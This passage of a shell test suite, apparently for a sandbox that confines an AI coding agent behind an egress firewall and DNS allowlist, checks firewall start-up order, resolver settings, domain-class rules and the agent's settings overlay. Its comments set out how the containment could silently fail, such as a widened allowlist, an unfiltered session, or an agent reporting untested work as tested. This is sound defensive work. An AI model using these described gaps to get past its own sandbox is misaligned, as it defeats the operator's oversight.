        bash "$REPO_ROOT/test/shellcheck.sh" --list | grep -qx "$f" \
            || { echo "$f is not shellchecked"; return 1; }
    done
}

@test "CI runs every confined suite, not just the ones someone remembered" {
    # The matrix in tests.yml is enumerated by hand, and test/run-confined.sh
    # discovers suites from the directory. So a suite added to the tree runs
    # locally and never runs in CI - a green set of checks covering less than
    # it appears to, which is this repo's least acceptable failure and one
    # nothing was watching for.
    #
    # Which suites are confined is run-confined.sh's own declaration, read
    # rather than restated: runtime and ci-runner are privileged and have their
    # own jobs elsewhere in this workflow, and a list here would be a second
    # place for that to be true.
    local matrix privileged f n
    matrix="$(sed -n '/^        suite:/,/^    name:/p' "$REPO_ROOT/.gitea/workflows/tests.yml" \
        | grep -oE '^          - [a-z-]+' | sed 's/^          - //')"
    [ -n "$matrix" ] || { echo "found no suite matrix in tests.yml"; return 1; }
    privileged="$(grep -oE '^PRIVILEGED=" [a-z -]+"' "$REPO_ROOT/test/run-confined.sh" \
        | sed -E 's/^PRIVILEGED=" //; s/ "$//')"
    [ -n "$privileged" ] || { echo "could not read the privileged list"; return 1; }

    for f in "$REPO_ROOT"/test/*.bats; do
        n="$(basename "$f" .bats)"
        [[ " $privileged " == *" $n "* ]] && continue
        grep -qx "$n" <<< "$matrix" \
            || { echo "test/$n.bats is a confined suite and CI never runs it"; return 1; }
    done

    # And the other direction, or the matrix names a job that fails on a
    # missing file rather than covering anything.
    while read -r n; do
        [ -n "$n" ] || continue
        [ -f "$REPO_ROOT/test/$n.bats" ] \
            || { echo "CI runs a suite that does not exist: $n"; return 1; }
    done <<< "$matrix"
}

@test "the changed lane's map names only suites that exist" {
    # The map is what --changed selects with, so a suite renamed out from under
    # it stops being selected silently: the run still says green, having
    # covered less than it claims. That is the exact failure the fast lane is
    # not allowed to have, so it is asserted rather than trusted.
    local names n
    names="$(sed -n '/^suites_for()/,/^}/p' "$REPO_ROOT/test/run-confined.sh" \
        | grep -oE "echo '[^']*'|echo [A-Za-z][A-Za-z-]*" \
        | sed -E "s/^echo '?//; s/'\$//")"
    [ -n "$names" ] || { echo "found no suite names in the map"; return 1; }
    for n in $names; do
        [ "$n" = ALL ] && continue
        [ -f "$REPO_ROOT/test/$n.bats" ] \
            || { echo "the change map names a suite that does not exist: $n"; return 1; }
    done
}

@test "an unmapped path selects every suite rather than none" {
    # A path nobody has mapped is a path nobody has decided about. Selecting
    # nothing there would be a run that passes having tested the change with
    # no suite at all, which reads identically to a run that covered it.
    run bash "$REPO_ROOT/test/run-confined.sh" --changed --list a/path/nobody/mapped
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    local suite
    for suite in static config providers project remote proxy audit; do
        [ -f "$REPO_ROOT/test/$suite.bats" ] || continue
        grep -qx "$suite" <<< "$output" \
            || { echo "an unmapped path did not select $suite: $output"; return 1; }
    done
}

@test "each lane says which one it is, and only one claims to be the gate" {
    # Two lanes are only safe while a run can be read back and identified. The
    # failure mode this exists against is an agent running the quick one,
    # seeing green and reporting the change as tested.
    local out
    out="$(bash "$REPO_ROOT/test/run-confined.sh" --changed --list bin/dejima-audit 2>&1)"
    [[ "$out" == *"lane: CHANGED"* ]] || { echo "$out"; return 1; }
    [[ "$out" == *"NOT the pull-request gate"* ]] || { echo "$out"; return 1; }

    out="$(bash "$REPO_ROOT/test/run-confined.sh" --list 2>&1)"
    [[ "$out" == *"lane: ALL"* ]] || { echo "$out"; return 1; }
    [[ "$out" == *"pull-request gate"* ]] || { echo "$out"; return 1; }
    # And it names what it still does not cover, since the privileged suites
    # are outside every lane here.
    [[ "$out" == *runtime* ]] || { echo "the gate lane hides what it cannot run: $out"; return 1; }
}

@test "shellcheck covers harness plugins, which carry no shebang" {
    # Plugins are sourced, so they have no shebang, so the shebang-based
    # discovery dropped them - silently, while they sit in the trusted
    # computing base. Every plugin is in the list or this is not true.
    local name
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        bash "$REPO_ROOT/test/shellcheck.sh" --list | grep -qx "bin/harness/$name.sh" \
            || { echo "bin/harness/$name.sh is not shellchecked"; return 1; }
    done < <(lib provider_list harness)
}

@test "shellcheck covers every docker/ script, sourced fragments included" {
    # Same failure as the plugins above and a worse place for it: caps-lib.sh
    # is sourced, so it has no shebang, and it holds the drop that decides what
    # capabilities a session runs with. fixed-domains.sh is the seam holding
    # the name allowlist and the address allowlist together.
    #
    # Enumerated from the tree rather than from a list here, so a fragment
    # added tomorrow is covered without anyone remembering this test.
    local f
    for f in "$SANDBOX_DIR"/*.sh; do
        [ -e "$f" ] || continue
        bash "$REPO_ROOT/test/shellcheck.sh" --list | grep -qx "docker/${f##*/}" \
            || { echo "docker/${f##*/} is not shellchecked"; return 1; }
    done
}

@test "the filter entrypoint brings the firewall up, and lets a failure stop it" {
    # Exactly one caller, and it is the one in the container that holds the
    # capabilities. A second caller in the session's container would try to
    # install rules in a namespace that already has them, and start a second
    # dnsmasq on an address the first one is already bound to.
    grep -qE '^/usr/local/bin/firewall-up\.sh$' "$SANDBOX_DIR/filter-entrypoint.sh" \
        || { echo "filter-entrypoint.sh does not call firewall-up.sh, or guards the call"; return 1; }
    # Code, not prose: the entrypoint may well go on mentioning the script in a
    # comment, and a check that could not tell the two apart would be one
    # nobody could satisfy while explaining why the call is absent.
    run bash -c "grep -vE '^[[:space:]]*#' '$SANDBOX_DIR/entrypoint.sh' | grep -n 'firewall-up'"
    [ "$status" -ne 0 ] \
        || { echo "the session's entrypoint still brings the firewall up: $output"; return 1; }

    # Unguarded is the point: under `set -e` a firewall that failed to come up
    # takes the container with it, and the readiness marker below it is never
    # written, so bin/dejima refuses the launch. `|| true`, an `if`, or a
    # background `&` would each turn that into a session running unfiltered.
    run grep -nE 'firewall-up\.sh.*(\|\||&|;)|(if|while).*firewall-up\.sh' \
        "$SANDBOX_DIR/filter-entrypoint.sh"
    [ "$status" -ne 0 ] \
        || { echo "the firewall-up call is guarded or backgrounded: $output"; return 1; }

    # And the marker is written after it, never before: it is what the launcher
    # waits on, so writing it first would announce a filter that is not there.
    local up_at ready_at
    up_at="$(grep -n '^/usr/local/bin/firewall-up\.sh$' "$SANDBOX_DIR/filter-entrypoint.sh" | cut -d: -f1)"
    ready_at="$(grep -n 'dejima-firewall-ready' "$SANDBOX_DIR/filter-entrypoint.sh" | grep -v '^ *#' | tail -1 | cut -d: -f1)"
    [ -n "$up_at" ] && [ -n "$ready_at" ] && [ "$up_at" -lt "$ready_at" ] \
        || { echo "the readiness marker is not written after the firewall comes up"; return 1; }
}


@test "the session container points itself at the namespace's resolver" {
    # /etc/resolv.conf is per container even when the network namespace is
    # shared - measured, and the reason this line has to exist at all.
    # egress-policy repoints the filter container's copy; Docker generated this
    # container's pointing straight at its embedded resolver.
    #
    # Left alone, every name the session looks up would go around the
    # restricted resolver. It would not silently succeed either - the policy
    # refuses this namespace's traffic to any resolver but its own - so the
    # symptom is a session that resolves nothing, which is why both halves have
    # to name the same address.
    grep -q 'echo "nameserver 127.0.0.1" > /etc/resolv.conf' "$SANDBOX_DIR/entrypoint.sh" \
        || { echo "the session container never points itself at the restricting resolver"; return 1; }

    grep -q "printf 'nameserver 127.0.0.1" "$SANDBOX_DIR/egress-policy" \
        || { echo "egress-policy no longer writes that address; the two have drifted"; return 1; }
    grep -q 'listen-address=127.0.0.1' "$SANDBOX_DIR/egress-policy" \
        || { echo "the resolver does not bind the address both halves name"; return 1; }
}


@test "dejima-allow changes the allowlist where it lives, and checks where it matters" {
    # The resolver and the packet filter are in the filter container. Every
    # mutation has to go there; the reachability probe has to stay in the
    # session's container, because that is the container whose reachability the
    # command claims to have changed. A probe that ran in the filter container
    # would pass on an arrangement where the session still could not reach it.
    local a="$REPO_ROOT/bin/dejima-allow"
    grep -q 'docker exec -u root "$filter" /usr/local/sbin/egress-policy' "$a" \
        || { echo "the permitted-set change does not target the filter container"; return 1; }
    grep -q 'docker exec "$container" curl' "$a" \
        || { echo "the reachability check no longer runs in the session's container"; return 1; }

    # Derived from Docker rather than recorded, so nothing has to be kept in
    # step with it.
    grep -q "HostConfig.NetworkMode" "$a" \
        || { echo "the filter container is not derived from the session's namespace"; return 1; }
}

@test "dejima-allow states the class, so a forge name cannot be widened by adding it" {
    # The open class carries no port restriction. A forge name added to it
    # would be reachable on 22 as well, which is the read-only guarantee gone -
    # from a command whose entire output says it granted one domain. It went
    # wrong exactly that way when the answer lived in two places, so the class
    # comes from the same file the container composes its own lists from.
    local a="$REPO_ROOT/bin/dejima-allow"
    grep -q 'source "$SCRIPT_DIR/../docker/fixed-domains.sh"' "$a" \
        || { echo "dejima-allow no longer shares the class rule with the container"; return 1; }
    grep -q 'dejima_class_for "$domain"' "$a" \
        || { echo "dejima-allow does not ask which class the domain belongs to"; return 1; }
    grep -q 'permit_args+=(--forge)' "$a" \
        || { echo "a forge-class domain is not added to the forge class"; return 1; }

    # And the rule itself still answers correctly, driven rather than grepped.
    run bash -c 'source "$1"; dejima_class_for "$2"' -- "$SANDBOX_DIR/fixed-domains.sh" api.github.com
    [ "$output" = forge ] || { echo "a subdomain of a forge suffix came back as $output"; return 1; }
    run bash -c 'source "$1"; dejima_class_for "$2"' -- "$SANDBOX_DIR/fixed-domains.sh" crates.io
    [ "$output" = open ] || { echo "an unrelated domain came back as $output"; return 1; }
    # The suffix must not match a name that merely ends in the same letters.
    run bash -c 'source "$1"; dejima_class_for "$2"' -- "$SANDBOX_DIR/fixed-domains.sh" notgithub.com
    [ "$output" = open ] || { echo "notgithub.com was treated as the forge"; return 1; }

    # DNS names are case-insensitive and the resolver treats them so, which is
    # what makes an uppercase spelling a way to land a forge name in the class
    # that carries no port restriction.
    run bash -c 'source "$1"; dejima_class_for "$2"' -- "$SANDBOX_DIR/fixed-domains.sh" API.GITHUB.COM
    [ "$output" = forge ] || { echo "an uppercase forge name came back as $output"; return 1; }
    run bash -c 'source "$1"; dejima_class_for "$2"' -- "$SANDBOX_DIR/fixed-domains.sh" NOTGITHUB.COM
    [ "$output" = open ] || { echo "NOTGITHUB.COM was treated as the forge"; return 1; }

    # Both sides of the comparison, because the suffix list is lowercase today
    # and folding only the argument would pass this while leaving the function
    # dependent on that staying true.
    run bash -c 'source "$1"; DEJIMA_FORGE_CLASS=("GITHUB.COM"); dejima_class_for "$2"' \
        -- "$SANDBOX_DIR/fixed-domains.sh" api.github.com
    [ "$output" = forge ] \
        || { echo "an uppercase suffix did not match a lowercase name: $output"; return 1; }
}

@test "the policy matches internal_domains case-insensitively too, like the launcher" {
    # Third site for the same rule. dejima_class_for and dejima_mark_internal
    # fold case on the launcher's side; build_entries compared verbatim, so a
    # pair the launcher had already accepted was refused one layer down, with a
    # message saying the name was permitted by nothing. A correct configuration
    # that will not start, from a spelling difference DNS does not recognise.
    local script="$BATS_TEST_TMPDIR/be.sh"
    {
        printf 'TABLE=t; ENTRIES_FILE=%q\n' "$BATS_TEST_TMPDIR/ents"
        printf 'FORGE_ENTRIES="github.com"; OPEN_ENTRIES="Git.Example.Com"\n'
        printf 'INTERNAL_OK="git.example.com"; INTERNAL_OK_HINT=hint\n'
        printf 'die() { echo "REFUSED: $*"; exit 1; }\nsay() { :; }\n'
        sed -n '/^classify_entry()/,/^}/p' "$SANDBOX_DIR/egress-policy"
        sed -n '/^record_entries()/,/^}/p' "$SANDBOX_DIR/egress-policy"
        sed -n '/^build_entries()/,/^}/p' "$SANDBOX_DIR/egress-policy"
        printf 'build_entries forge.example.com && echo booted\n'
    } > "$script"

    run bash "$script"
    [ "$status" -eq 0 ] \
        || { echo "a case difference refused the launch: $output"; return 1; }

    # And a name nothing permits is still refused, whatever its case.
    sed -i 's/INTERNAL_OK="git.example.com"/INTERNAL_OK="Never.Approved.Example.Com"/' "$script"
    run bash "$script"
    [ "$status" -ne 0 ] \
        || { echo "an unpermitted name was exempted: $output"; return 1; }
}

@test "nothing reaches the open class that the forge class covers, whatever route it took" {
    # The comment in fixed-domains.sh says the forge class wins wherever the two
    # overlap. Only the approved-domains loop asked, so a name in the built-in
    # open list that sits under a built-in forge suffix kept the open class -
    # and release-assets.githubusercontent.com is exactly that. It then gets a
    # resolver line more specific than the suffix entry, feeding the set with no
    # port restriction, and the 443 clamp rests on the forge's published ranges
    # alone. The last release restricted it.
    #
    # Asserted over the shipped defaults with nothing else set, because that is
    # the configuration every operator has before they declare anything.
    local out
    out=$(env -i bash -c '
        set -uo pipefail
        source "$1"
        '"$(sed -n '/^_join()/,/^}/p' "$SANDBOX_DIR/firewall-up.sh")"'
        '"$(sed -n '/^_forge_extra=""/,/^EGRESS_ALLOWED_NAMES=/p' "$SANDBOX_DIR/firewall-up.sh")"'
        printf "forge:%s\n" "$EGRESS_FORGE_NAMES"
        printf "open:%s\n" "$EGRESS_ALLOWED_NAMES"
    ' _ "$SANDBOX_DIR/fixed-domains.sh") || { echo "composition failed: $out"; return 1; }

    local open_names name
    open_names=$(sed -n 's/^open://p' <<< "$out")
    [ -n "$open_names" ] || { echo "no open-class names at all: $out"; return 1; }
    for name in $open_names; do
        run bash -c 'source "$1"; dejima_class_for "$2"' -- "$SANDBOX_DIR/fixed-domains.sh" "$name"
        [ "$output" = open ] \
            || { echo "$name is $output class and reached the open class anyway"; return 1; }
    done

    # And the name that prompted this is in the forge class rather than dropped.
    grep -q '^forge:.*release-assets\.githubusercontent\.com' <<< "$out" \
        || { echo "the overlapping name did not reach the forge class: $out"; return 1; }
}

@test "internal_domains and the key that permitted the host may differ in case" {
    # dejima_mark_internal returns non-zero for an entry nothing permits, and
    # the caller stops the container naming it. So comparing verbatim turns a
    # bare case difference between two operator keys into a launch that refuses
    # to start, on a configuration that is correct - and the message says the
    # name is permitted by nothing when it is permitted.
    #
    # No forge involved: this is two ordinary keys naming the same host.
    run bash -c '
        source "$1"
        dejima_permit_open "$2"
        dejima_mark_internal "$3" || { echo "BOOT ABORTS"; exit 1; }
        echo ok
    ' -- "$SANDBOX_DIR/fixed-domains.sh" loki.example.com LOKI.EXAMPLE.COM
    [ "$status" -eq 0 ] \
        || { echo "an uppercase internal_domains entry stops the boot: $output"; return 1; }

    run bash -c '
        source "$1"
        dejima_permit_open "$2"
        dejima_mark_internal "$3" || { echo "BOOT ABORTS"; exit 1; }
        echo ok
    ' -- "$SANDBOX_DIR/fixed-domains.sh" LOKI.EXAMPLE.COM loki.example.com
    [ "$status" -eq 0 ] \
        || { echo "an uppercase approved entry stops the boot: $output"; return 1; }

    # And it still refuses a name nothing permits, which is the point of it.
    run bash -c '
        source "$1"
        dejima_permit_open "$2"
        dejima_mark_internal "$3" || { echo "refused"; exit 1; }
        echo ok
    ' -- "$SANDBOX_DIR/fixed-domains.sh" loki.example.com never-approved.example.com
    [ "$status" -ne 0 ] \
        || { echo "an unpermitted name was exempted: $output"; return 1; }
}

@test "the boot path states the class too, so an approved forge name is not widened" {
    # The same question as the test above, asked of the other path that turns a
    # name into a permitted entry: the approved-domains loop at container start.
    # Both have to ask, and only one of them did.
    #
    # A forge name here would get the resolver a more specific line feeding the
    # open-class set, so its answers would stop reaching the forge set and the
    # port restriction would rest on the published ranges alone - one layer
    # where the design has two.
    local f="$SANDBOX_DIR/firewall-up.sh"
    grep -q 'dejima_class_for "$_domain"' "$f" \
        || { echo "the approved-domains loop does not ask which class a domain is"; return 1; }

    # Driven, not grepped - and driving the loop that is in the file rather than
    # a copy of it written here, which would keep passing after a revert.
    local loop
    loop=$(sed -n '/^for _domain in \${ALLOWED_DOMAINS/,/^done$/p' "$f")
    [ -n "$loop" ] || { echo "could not find the approved-domains loop in $f"; return 1; }

    run bash -c '
        set -euo pipefail
        source "$1"
        ALLOWED_DOMAINS="$2"
        eval "$3"
        printf "open: %s\n" ${DEJIMA_OPEN_CLASS[@]+"${DEJIMA_OPEN_CLASS[@]}"}
        printf "forge: %s\n" ${DEJIMA_FORGE_CLASS[@]+"${DEJIMA_FORGE_CLASS[@]}"}
    ' -- "$SANDBOX_DIR/fixed-domains.sh" "api.github.com crates.io objects.githubusercontent.com" "$loop"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"open: crates.io"* ]] \
        || { echo "an open-class domain did not reach the open class: $output"; return 1; }
    [[ "$output" != *"open: api.github.com"* ]] \
        || { echo "a forge-class domain was added to the open class: $output"; return 1; }
    [[ "$output" != *"open: objects.githubusercontent.com"* ]] \
        || { echo "a forge-class domain was added to the open class: $output"; return 1; }

    # Recorded in the forge class rather than dropped. Skipping would leave it
    # reachable by suffix but absent from every list, and the internal_domains
    # check below matches by exact string - see the test that drives it.
    [[ "$output" == *"forge: api.github.com"* ]] \
        || { echo "a forge-class domain was not recorded at all: $output"; return 1; }
}

@test "an approved forge subdomain can also be declared internal, without stopping the boot" {
    # [core] internal_domains is checked against the permitted lists by exact
    # string. A name the approved-domains loop leaves out of every list - because
    # a forge suffix already covers it - reads to that check as a name nothing
    # permits, and the launch stops on a configuration that is correct. Split
    # horizon DNS for a forge subdomain is the case that reaches it.
    #
    # Both fragments come out of the file, so this fails if either the loop or
    # the check is changed to disagree with the other.
    local f="$SANDBOX_DIR/firewall-up.sh" loop check
    loop=$(sed -n '/^for _domain in \${ALLOWED_DOMAINS/,/^done$/p' "$f")
    check=$(sed -n '/^_unknown=""/,/^done$/p' "$f")
    [ -n "$loop" ] && [ -n "$check" ] \
        || { echo "could not extract the loop and the internal check from $f"; return 1; }

    run bash -c '
        set -euo pipefail
        source "$1"
        ALLOWED_DOMAINS="$2"
        DEJIMA_INTERNAL_DOMAINS="$3"
        eval "$4"
        eval "$5"
        [ -z "$_unknown" ] || { echo "unknown:$_unknown"; exit 1; }
        echo ok
    ' -- "$SANDBOX_DIR/fixed-domains.sh" "api.github.com" "api.github.com" "$loop" "$check"
    [ "$status" -eq 0 ] \
        || { echo "declaring an approved forge subdomain internal stops the boot: $output"; return 1; }

    # And the key still refuses a name nothing approved, which is what it is for.
    run bash -c '
        set -euo pipefail
        source "$1"
        ALLOWED_DOMAINS="$2"
        DEJIMA_INTERNAL_DOMAINS="$3"
        eval "$4"
        eval "$5"
        [ -z "$_unknown" ] || { echo "unknown:$_unknown"; exit 1; }
        echo ok
    ' -- "$SANDBOX_DIR/fixed-domains.sh" "crates.io" "never-approved.example.com" "$loop" "$check"
    [ "$status" -ne 0 ] \
        || { echo "internal_domains accepted a name nothing permits: $output"; return 1; }
}

# Drive the policy's own classifier, with `die` stubbed so a refusal is a
# non-zero exit rather than an aborted shell.
_classify() {  # <value> -> prints addr|name, or exits non-zero on a refusal
    bash -c '
        die() { echo "refused: $*" >&2; exit 1; }
        eval "$1"
        classify_entry "$2"
    ' -- "$(sed -n "/^classify_entry()/,/^}/p" "$SANDBOX_DIR/egress-policy")" "$1"
}

@test "a permitted destination must be fully qualified, and says why it must" {
    # A bare label cannot work here and must not be accepted as though it could.
    #
    # It would never resolve: the resolver config sets domain-needed, which stops
    # dnsmasq forwarding a dotless query at all. And an entry becomes a
    # `server=/<entry>/` line, which dnsmasq matches against the name and
    # everything under it - so permitting `org` would resolve every .org name
    # into the open class, which carries no port restriction.
    #
    # Refused with its own message rather than the generic one, because a LAN
    # host name is written on purpose and "neither a host name nor an address"
    # reads as a typo.
    local v
    for v in loki gitbox ollama org; do
        run _classify "$v"
        [ "$status" -ne 0 ] \
            || { echo "'$v' was accepted as a permitted entry, and it cannot resolve"; return 1; }
        [[ "$output" == *"has no dot"* ]] \
            || { echo "'$v' was refused without saying why: $output"; return 1; }
    done

    # The property the launcher and the policy have to agree on is what the
    # resolver can actually serve. Stated here so the two are read together:
    # `valid_domain` accepting a bare label is about host-side resolution, which
    # is a different question from what this policy can permit.
    # The directive itself, on a line of its own, and not the word appearing in
    # the comment and the refusal message above - both of which name it, so a
    # grep over the file is satisfied by the very text whose accuracy it is
    # supposed to be checking.
    grep -qx 'domain-needed' "$SANDBOX_DIR/egress-policy" \
        || { echo "domain-needed is gone, so this refusal's stated reason no longer holds"; return 1; }

    for v in loki.example.com deep.sub.example.com; do
        run _classify "$v"
        [ "$status" -eq 0 ] && [ "$output" = name ] \
            || { echo "the policy refuses '$v', which is fully qualified: $output"; return 1; }
    done

    # Addresses and prefixes are permitted directly, without a lookup.
    for v in 192.0.2.10 192.0.2.0/24; do
        run _classify "$v"
        [ "$status" -eq 0 ] && [ "$output" = addr ] \
            || { echo "'$v' did not classify as an address: $output"; return 1; }
    done

    # And the refusals the classifier exists for still refuse. An IPv6 entry in
    # particular: this policy refuses the family, so permitting one cannot mean
    # what whoever wrote it down meant.
    for v in 2001:db8::1 'http://example.com' 'a_b' '-nope' 'nope-' 'example.com/path'; do
        run _classify "$v"
        [ "$status" -ne 0 ] \
            || { echo "'$v' was accepted as a permitted entry ($output)"; return 1; }
    done
}

@test "an unparseable settings.json stops the launch instead of being ignored" {
    # Claude Code ignores a settings.json it cannot parse, wholesale and with
    # a startup warning only - so the session would run without the
    # permissions, hooks and plugins the operator configured, and the first
    # symptom is an unrelated-looking bypass-mode warning.
    local home overlay
    home="$(_settings_home)"
    printf '{"permissions": [oops\n' > "$home/.claude/settings.json"
    overlay="$(mktemp)"
    run bash -c '
        source "$1"
        harness_plugin_load claude-code
        HOME="$3" harness_prepare_config "$2"' _ \
        "$REPO_ROOT/bin/dejima-harness-lib.sh" "$overlay" "$home"
    rm -f "$overlay"
    [ "$status" -ne 0 ] || { echo "a broken settings.json was accepted"; return 1; }
    [[ "$output" == *"not valid JSON"* ]] || { echo "$output"; return 1; }
}

@test "core names no harness config file of its own" {
    # The three that used to live in bin/dejima - creating settings.json and
    # CLAUDE.md by name, parsing settings.json, and generating Claude Code's
    # own settings schema - are the plugin's now. Core creates the file and
    # decides where it is mounted; what goes in it is the harness's.
    run grep -nE '\$HOME/\.claude/(settings\.json|CLAUDE\.md)' "$REPO_ROOT/bin/dejima"
    [ "$status" -ne 0 ] || { echo "core still names a harness config file:"; echo "$output"; return 1; }
    run grep -n 'sandbox: {enabled' "$REPO_ROOT/bin/dejima"
    [ "$status" -ne 0 ] || { echo "core still generates the harness's settings schema"; return 1; }
}

@test "the override layer is mounted outside ~/.claude and passed as --settings" {
    # Mounting it over ~/.claude/settings.json put the mount point inside the
    # read-write ~/.claude mount, where a host-side rename of the real file
    # detached it mid-session and silently reverted every override (#47).
    # A container-local path can't be renamed over from the host.
    grep -qE '^\s*-\s*\$\{SANDBOX_SETTINGS_FILE.*\}:/etc/dejima-settings\.json:ro\s*$' "$SANDBOX_DIR/docker-compose.yml"
    run grep -E '^\s*-\s*\$\{SANDBOX_SETTINGS_FILE.*\}:\$\{HOME\}/' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
    # Which only takes effect if the flag is actually passed. It goes in the
    # wrapper rather than the entrypoint so it also covers invocations the
    # entrypoint never sees (an interactive shell, claudecode.nvim).
    # The flag itself is the harness's now, not the wrapper's: the wrapper
    # is shared and a --settings it hardcoded would be handed to a harness
    # that layers settings some other way.
    grep -qE -- 'settings_args\s*=\s*--settings /etc/dejima-settings\.json' \
        "$REPO_ROOT/harnesses/claude-code/harness.conf"
    grep -q 'SANDBOX_HARNESS_SETTINGS' "$SANDBOX_DIR/harness-wrapper.sh"
    grep -qE -- '\$\{settings\[@\]\+"\$\{settings\[@\]\}"\}' "$SANDBOX_DIR/harness-wrapper.sh"
}

@test "the harness's config files are created in the container, not on the host" {
    # dejima used to create an empty settings.json and CLAUDE.md in the
    # operator's ~/.claude so that staging had something to copy. The file is
    # needed in the container, so that is where it is made - and a file the
    # operator does not have is not one dejima should put on their machine.
    local home overlay staged
    home="$(mktemp -d)"
    overlay="$(mktemp)"
    run bash -c '
        source "$1"
        harness_plugin_load claude-code
        HOME="$3" harness_prepare_config "$2"' _ \
        "$REPO_ROOT/bin/dejima-harness-lib.sh" "$overlay" "$home"
    rm -f "$overlay"
    [ "$status" -eq 0 ] || { echo "$output"; rm -rf "$home"; return 1; }
    [ -z "$(find "$home" -mindepth 1 2>/dev/null)" ] \
        || { echo "created on the host: $(find "$home" -mindepth 1)"; rm -rf "$home"; return 1; }

    staged="$(_declared_for_home "$home" claude-code harness_staged_config_load DEJIMA_STAGED_CONFIG)"
    # settings.json asks for `{}` rather than an empty file: an empty one is
    # not valid JSON, and Claude Code discards a settings.json it cannot parse
    # wholesale - which is the condition this exists to avoid, not cause.
    grep -qE "\.claude/settings\.json"$'\t'"ensure-json$" <<< "$staged" \
        || { echo "settings.json is not asked for as JSON: $staged"; rm -rf "$home"; return 1; }
    grep -qE "\.claude/CLAUDE\.md"$'\t'"ensure$" <<< "$staged" \
        || { echo "CLAUDE.md is not asked for: $staged"; rm -rf "$home"; return 1; }
    # statusline.sh is deliberately NOT among them. It is staged executable
    # and named by settings.json's statusLine.command, so a placeholder would
    # be a status line that runs and does nothing, in place of none.
    grep -qE "statusline\.sh"$'\t'"ensure" <<< "$staged" \
        && { echo "a placeholder statusline.sh would be run"; rm -rf "$home"; return 1; }
    # And the entrypoint writes the JSON one as JSON.
    grep -q "printf '{}" "$REPO_ROOT/docker/entrypoint.sh" \
        || { echo "the entrypoint does not write a parseable placeholder"; rm -rf "$home"; return 1; }
    rm -rf "$home"
}

@test "an existing config file is left exactly as the operator wrote it" {
    local home overlay
    home="$(_settings_home)"
    printf '{"env":{"KEEP":"me"}}\n' > "$home/.claude/settings.json"
    printf 'operator prose\n' > "$home/.claude/CLAUDE.md"
    overlay="$(mktemp)"
    run bash -c '
        source "$1"
        harness_plugin_load claude-code
        HOME="$3" harness_prepare_config "$2"' _ \
        "$REPO_ROOT/bin/dejima-harness-lib.sh" "$overlay" "$home"
    rm -f "$overlay"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    grep -q '"KEEP"' "$home/.claude/settings.json" || { echo "settings.json was overwritten"; return 1; }
    grep -q 'operator prose' "$home/.claude/CLAUDE.md" || { echo "CLAUDE.md was overwritten"; return 1; }
}

@test "Dockerfile never installs bubblewrap or socat" {
    # Nothing needs them now that sandbox.enabled is forced off - if they
    # come back, it's worth asking why before just re-adding them.
    run grep -E '^\s*(bubblewrap|socat)\s*\\?\s*$' "$SANDBOX_DIR/Dockerfile"
    [ "$status" -ne 0 ]
}

@test "the briefing never tells the agent to worktree outside the mounted project" {
    # ../<branch> (a sibling of the mounted project) or anything under $HOME
    # lands in container-local ephemeral storage, not real host storage -
    # the worktree, and whatever work went into it, silently vanishes when
    # the session ends. Regression check for exactly this bug. This
    # paragraph is core briefing prose (bin/dejima-provider-lib.sh), not
    # something the hook carries anymore - see providers.bats/config.bats
    # for the hook's own (much narrower) job.
    run grep -E '(worktree add|git worktree)[^\\n]*\.\./' "$REPO_ROOT/bin/dejima-provider-lib.sh"
    [ "$status" -ne 0 ]
    grep -q '.worktrees/' "$REPO_ROOT/bin/dejima-provider-lib.sh"
}

@test "the worktree-pr workflow tells the agent to close issues via the PR body" {
    # The session ends at the PR and the merge happens later, without the
    # agent - so anything it defers to "after the merge" is something it
    # won't be there to do, and an issue a merged PR fixed just stays open.
    # A closing keyword in the body is the only part of that it can control.
    # This lives in the workflow's own briefing fragment now, not the hook.
    grep -q 'Fixes #N' "$REPO_ROOT/workflows/worktree-pr/briefing.md"
    # And the counterpart, so partial work doesn't close anything.
    grep -q 'Refs #N' "$REPO_ROOT/workflows/worktree-pr/briefing.md"
    # The short form specifically: an issue's full URL renders as the same
    # link but does not trigger the close.
    grep -q "not the issue's URL" "$REPO_ROOT/workflows/worktree-pr/briefing.md"
}

@test "the worktree-pr workflow tells the agent not to hard-wrap bodies, and how to fix one" {
    # The forge renders a single newline as a line break, so a body wrapped
    # at a column arrives broken every ten words - worst on a phone, where
    # the screen wraps the line and the stray newline wraps it again. The
    # tools deliberately do not reflow anything (#79), which puts the whole
    # of this on the briefing.
    grep -q 'hard-wrap' "$REPO_ROOT/workflows/worktree-pr/briefing.md"
    grep -q 'newline as a line break' "$REPO_ROOT/workflows/worktree-pr/briefing.md"
    # And that revising the file a body came from sends nothing by itself -
    # the other half of #79, where edits were reported but never made.
    grep -q 'edit <N>' "$REPO_ROOT/workflows/worktree-pr/briefing.md"
}

@test "entrypoint runs as root and drops to node via gosu, not a baked-in USER node" {
    # The whole privilege-drop model depends on entrypoint.sh itself starting
    # as root (to set up the firewall) - a stray `USER node` before
    # ENTRYPOINT would silently break that.
    run tail -n 5 "$SANDBOX_DIR/Dockerfile"
    [[ "$output" == *"ENTRYPOINT"* ]]
    ! grep -qE '^\s*USER\s+node\s*$' <(tail -n 8 "$SANDBOX_DIR/Dockerfile")
}

@test "a command an operator is told to run does not carry a bin/ prefix" {
    # install.sh links these into ~/.local/bin, so they are on PATH by name.
    # An operator reading "bin/dejima-allow ..." is generally not standing in
    # the dejima checkout, so the prefix does not merely look odd - the
    # command fails outright, and it fails looking like the tool is broken.
    #
    # Checked on the strings that get shown rather than on source comments,
    # which legitimately name the file.
    local tools name f hits="" line
    tools="$(sed -n 's/^link_bin \([a-z-]*\).*/\1/p' "$REPO_ROOT/install.sh")"
    [ -n "$tools" ] || { echo "install.sh links nothing - has link_bin gone?"; return 1; }
    for f in "$REPO_ROOT"/bin/dejima-provider-lib.sh "$REPO_ROOT"/bin/harness/*.sh \
             "$REPO_ROOT"/hooks/*.sh; do
        [ -f "$f" ] || continue
        for name in $tools; do
            # An invocation, not a mention: the name followed by an argument.
            while IFS= read -r line; do
                [ -n "$line" ] || continue
                hits="$hits
  $(basename "$f"): $line"
            done < <(grep -nE "bin/$name [-<\$]" "$f" | grep -v '^[0-9]*:#')
        done
    done
    [ -z "$hits" ] || { echo "these tell someone to run a path, not a command:$hits"; return 1; }
}

@test "bin/dejima and bin/dejima-allow resolve their own location through symlinks" {
    # install.sh symlinks both into ~/.local/bin so they can be run by name
